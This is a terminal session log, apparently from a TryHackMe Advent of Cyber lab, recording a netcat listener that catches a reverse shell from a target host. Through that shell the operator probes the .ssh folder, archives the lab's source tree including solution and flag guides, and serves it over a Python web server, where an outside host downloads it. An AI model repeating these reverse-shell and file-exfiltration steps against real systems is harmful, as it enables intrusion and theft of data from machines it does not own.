@@ -1,0 +1,201 @@
+Script started on 2025-12-14 20:49:29+03:00 [COMMAND="nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+listening on [any] 6047 ...
+connect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 14505
+mrbombastic@tryhackme-2204:/home/ubuntu$ ls -al
+ls -al
+total 32
+drwxr-xr-x  5 ubuntu ubuntu 4096 Oct 17 11:53 .
+drwxr-xr-x  4 root   root   4096 Oct 22 09:00 ..
+lrwxrwxrwx  1 ubuntu ubuntu    9 Oct 22  2024 .bash_history -> /dev/null
+-rw-r--r--  1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
+-rw-r--r--  1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
+drwx------  2 ubuntu ubuntu 4096 Oct 22  2024 .cache
+-rw-r--r--  1 ubuntu ubuntu  807 Feb 25  2020 .profile
+drwx------  2 ubuntu ubuntu 4096 Oct 22  2024 .ssh
+-rw-r--r--  1 ubuntu ubuntu    0 Oct 22  2024 .sudo_as_admin_successful
+drwxrwxr-x 10 ubuntu ubuntu 4096 Oct 17 11:53 aoc-hopperoo-2025
+mrbombastic@tryhackme-2204:/home/ubuntu$ which zip
+which zip
+mrbombastic@tryhackme-2204:/home/ubuntu$ ls -al .ssh
+ls -al .ssh
+ls: cannot open directory '.ssh': Permission denied
+mrbombastic@tryhackme-2204:/home/ubuntu$ tar -czvf aoc-hopperoo-2025.tar.gz aoc-hopperoo-2025
+tar -czvf aoc-hopperoo-2025.tar.gz aoc-hopperoo-2025
+aoc-hopperoo-2025/
+tar (child): aoc-hopperoo-2025.tar.gz: Cannot open: Permission denied
+tar (child): Error is not recoverable: exiting now
+aoc-hopperoo-2025/ARCHITECTURE.md
+tar: aoc-hopperoo-2025.tar.gz: Cannot write: Broken pipe
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+mrbombastic@tryhackme-2204:/home/ubuntu$ tar -czvf /tmp/aoc-hopperoo-2025.tar.gz aoc-hopperoo-2025
+tar -czvf /tmp/aoc-hopperoo-2025.tar.gz aoc-hopperoo-2025
+aoc-hopperoo-2025/
+aoc-hopperoo-2025/ARCHITECTURE.md
+aoc-hopperoo-2025/ESCAPE-COMMANDS.md
+aoc-hopperoo-2025/deployer/
+aoc-hopperoo-2025/deployer/Dockerfile
+aoc-hopperoo-2025/version.txt
+aoc-hopperoo-2025/solution.md
+aoc-hopperoo-2025/docker-compose.yml
+aoc-hopperoo-2025/COMMAND-GUIDE.md
+aoc-hopperoo-2025/web-app/
+aoc-hopperoo-2025/web-app/requirements.txt
+aoc-hopperoo-2025/web-app/Dockerfile
+aoc-hopperoo-2025/web-app/version.txt
+aoc-hopperoo-2025/web-app/app.py
+aoc-hopperoo-2025/.git/
+aoc-hopperoo-2025/.git/description
+aoc-hopperoo-2025/.git/info/
+aoc-hopperoo-2025/.git/info/exclude
+aoc-hopperoo-2025/.git/HEAD
+aoc-hopperoo-2025/.git/hooks/
+aoc-hopperoo-2025/.git/hooks/pre-rebase.sample
+aoc-hopperoo-2025/.git/hooks/push-to-checkout.sample
+aoc-hopperoo-2025/.git/hooks/pre-push.sample
+aoc-hopperoo-2025/.git/hooks/post-update.sample
+aoc-hopperoo-2025/.git/hooks/applypatch-msg.sample
+aoc-hopperoo-2025/.git/hooks/prepare-commit-msg.sample
+aoc-hopperoo-2025/.git/hooks/update.sample
+aoc-hopperoo-2025/.git/hooks/commit-msg.sample
+aoc-hopperoo-2025/.git/hooks/pre-receive.sample
+aoc-hopperoo-2025/.git/hooks/pre-commit.sample
+aoc-hopperoo-2025/.git/hooks/pre-merge-commit.sample
+aoc-hopperoo-2025/.git/hooks/fsmonitor-watchman.sample
+aoc-hopperoo-2025/.git/hooks/pre-applypatch.sample
+aoc-hopperoo-2025/.git/objects/
+aoc-hopperoo-2025/.git/objects/info/
+aoc-hopperoo-2025/.git/objects/pack/
+aoc-hopperoo-2025/.git/objects/pack/pack-d793460d497ba626cdc3ab805ef355c73aaf0c8e.pack
+aoc-hopperoo-2025/.git/objects/pack/pack-d793460d497ba626cdc3ab805ef355c73aaf0c8e.idx
+aoc-hopperoo-2025/.git/index
+aoc-hopperoo-2025/.git/config
+aoc-hopperoo-2025/.git/packed-refs
+aoc-hopperoo-2025/.git/refs/
+aoc-hopperoo-2025/.git/refs/heads/
+aoc-hopperoo-2025/.git/refs/heads/main
+aoc-hopperoo-2025/.git/refs/remotes/
+aoc-hopperoo-2025/.git/refs/remotes/origin/
+aoc-hopperoo-2025/.git/refs/remotes/origin/HEAD
+aoc-hopperoo-2025/.git/refs/tags/
+aoc-hopperoo-2025/.git/logs/
+aoc-hopperoo-2025/.git/logs/HEAD
+aoc-hopperoo-2025/.git/logs/refs/
+aoc-hopperoo-2025/.git/logs/refs/heads/
+aoc-hopperoo-2025/.git/logs/refs/heads/main
+aoc-hopperoo-2025/.git/logs/refs/remotes/
+aoc-hopperoo-2025/.git/logs/refs/remotes/origin/
+aoc-hopperoo-2025/.git/logs/refs/remotes/origin/HEAD
+aoc-hopperoo-2025/.git/branches/
+aoc-hopperoo-2025/README.md
+aoc-hopperoo-2025/privileged-container/
+aoc-hopperoo-2025/privileged-container/Dockerfile
+aoc-hopperoo-2025/privileged-container/setup_users.sh
+aoc-hopperoo-2025/cleanup.sh
+aoc-hopperoo-2025/TESTING.md
+aoc-hopperoo-2025/switch-skin.sh
+aoc-hopperoo-2025/FLAG-GUIDE.md
+aoc-hopperoo-2025/setup.sh
+aoc-hopperoo-2025/uptime-checker/
+aoc-hopperoo-2025/uptime-checker/Dockerfile
+aoc-hopperoo-2025/uptime-checker/index.html
+aoc-hopperoo-2025/docker-lab-aoc-2025/
+aoc-hopperoo-2025/docker-lab-aoc-2025/ARCHITECTURE.md
+aoc-hopperoo-2025/docker-lab-aoc-2025/solution.md
+aoc-hopperoo-2025/docker-lab-aoc-2025/docker-compose.yml
+aoc-hopperoo-2025/docker-lab-aoc-2025/web-app/
+aoc-hopperoo-2025/docker-lab-aoc-2025/web-app/requirements.txt
+aoc-hopperoo-2025/docker-lab-aoc-2025/web-app/Dockerfile
+aoc-hopperoo-2025/docker-lab-aoc-2025/web-app/app.py
+aoc-hopperoo-2025/docker-lab-aoc-2025/QUICK-REFERENCE.md
+aoc-hopperoo-2025/docker-lab-aoc-2025/README.md
+aoc-hopperoo-2025/docker-lab-aoc-2025/privileged-container/
+aoc-hopperoo-2025/docker-lab-aoc-2025/privileged-container/Dockerfile
+aoc-hopperoo-2025/docker-lab-aoc-2025/privileged-container/setup_users.sh
+aoc-hopperoo-2025/docker-lab-aoc-2025/cleanup.sh
+aoc-hopperoo-2025/docker-lab-aoc-2025/TESTING.md
+aoc-hopperoo-2025/docker-lab-aoc-2025/setup.sh
+aoc-hopperoo-2025/docker-lab-aoc-2025/challenge-description.md
+aoc-hopperoo-2025/wareville-times/
+aoc-hopperoo-2025/wareville-times/Dockerfile
+aoc-hopperoo-2025/wareville-times/index.html
+aoc-hopperoo-2025/challenge-description.md
+aoc-hopperoo-2025/dasherapp/
+aoc-hopperoo-2025/dasherapp/requirements.txt
+aoc-hopperoo-2025/dasherapp/Dockerfile
+aoc-hopperoo-2025/dasherapp/version.txt
+aoc-hopperoo-2025/dasherapp/app.py
+mrbombastic@tryhackme-2204:/home/ubuntu$ cd /tmp
+cd /tmp
+mrbombastic@tryhackme-2204:/tmp$ ls -al
+ls -al
+total 148
+drwxrwxrwt 12 root        root         4096 Dec 14 17:53 .
+drwxr-xr-x 19 root        root         4096 Dec 14 17:35 ..
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .ICE-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .Test-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .X11-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .XIM-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .font-unix
+-rw-rw-r--  1 mrbombastic mrbombastic 98898 Dec 14 17:53 aoc-hopperoo-2025.tar.gz
+drwx------  3 root        root         4096 Dec 14 17:35 snap-private-tmp
+drwx------  3 root        root         4096 Dec 14 17:35 systemd-private-fd00dab4117d479a992f12bd5d44729b-ModemManager.service-YjsUVe
+drwx------  3 root        root         4096 Dec 14 17:35 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-logind.service-meePbV
+drwx------  3 root        root         4096 Dec 14 17:48 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-resolved.service-Sb50rq
+drwx------  3 root        root         4096 Dec 14 17:48 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-timesyncd.service-jAFxW0
+mrbombastic@tryhackme-2204:/tmp$ python3 -m http.server 6047
+python3 -m http.server 6047
+^C
+
+Script done on 2025-12-14 20:54:48+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-12-14 20:54:52+03:00 [COMMAND="nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+listening on [any] 6047 ...
+connect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 14686
+mrbombastic@tryhackme-2204:/home/ubuntu$ cd /tmp
+cd /tmp
+mrbombastic@tryhackme-2204:/tmp$ ls -al
+ls -al
+total 148
+drwxrwxrwt 12 root        root         4096 Dec 14 17:54 .
+drwxr-xr-x 19 root        root         4096 Dec 14 17:35 ..
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .ICE-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .Test-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .X11-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .XIM-unix
+drwxrwxrwt  2 root        root         4096 Dec 14 17:35 .font-unix
+-rw-rw-r--  1 mrbombastic mrbombastic 98898 Dec 14 17:53 aoc-hopperoo-2025.tar.gz
+drwx------  3 root        root         4096 Dec 14 17:35 snap-private-tmp
+drwx------  3 root        root         4096 Dec 14 17:35 systemd-private-fd00dab4117d479a992f12bd5d44729b-ModemManager.service-YjsUVe
+drwx------  3 root        root         4096 Dec 14 17:35 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-logind.service-meePbV
+drwx------  3 root        root         4096 Dec 14 17:48 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-resolved.service-Sb50rq
+drwx------  3 root        root         4096 Dec 14 17:48 systemd-private-fd00dab4117d479a992f12bd5d44729b-systemd-timesyncd.service-jAFxW0
+mrbombastic@tryhackme-2204:/tmp$ python  3 -m http.server 1337
+python3 -m http.server 1337
+192.168.168.93 - - [14/Dec/2025 17:55:42] "GET / HTTP/1.1" 200 -
+192.168.168.93 - - [14/Dec/2025 17:55:43] code 404, message File not found
+192.168.168.93 - - [14/Dec/2025 17:55:43] "GET /favicon.ico HTTP/1.1" 404 -
+192.168.168.93 - - [14/Dec/2025 17:56:48] "GET /aoc-hopperoo-2025.tar.gz HTTP/1.1" 200 -
+^C
+
+Script done on 2025-12-14 21:11:19+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-12-14 21:11:34+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 10261
+mrbombastic@tryhackme-2204:/home/ubuntu$ [Kmrbombastic@tryhackme-2204:/home/ubuntu$ [K[?2004hmrbombastic@tryhackme-2204:/home/ubuntu$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 32
+drwxr-xr-x  5 ubuntu ubuntu 4096 Oct 17 11:53 .
+drwxr-xr-x  4 root   root   4096 Oct 22 09:00 ..
+lrwxrwxrwx  1 ubuntu ubuntu    9 Oct 22  2024 .bash_history -> /dev/null
+-rw-r--r--  1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
+-rw-r--r--  1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
+drwx------  2 ubuntu ubuntu 4096 Oct 22  2024 .cache
+-rw-r--r--  1 ubuntu ubuntu  807 Feb 25  2020 .profile
+drwx------  2 ubuntu ubuntu 4096 Oct 22  2024 .ssh
+-rw-r--r--  1 ubuntu ubuntu    0 Oct 22  2024 .sudo_as_admin_successful
+drwxrwxr-x 10 ubuntu ubuntu 4096 Oct 17 11:53 aoc-hopperoo-2025
+mrbombastic@tryhackme-2204:/home/ubuntu$ [Kmrbombastic@tryhackme-2204:/home/ubuntu$ [K[?2004hmrbombastic@tryhackme-2204:/home/ubuntu$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-12-14 21:11:51+03:00 [COMMAND_EXIT_CODE="0"]
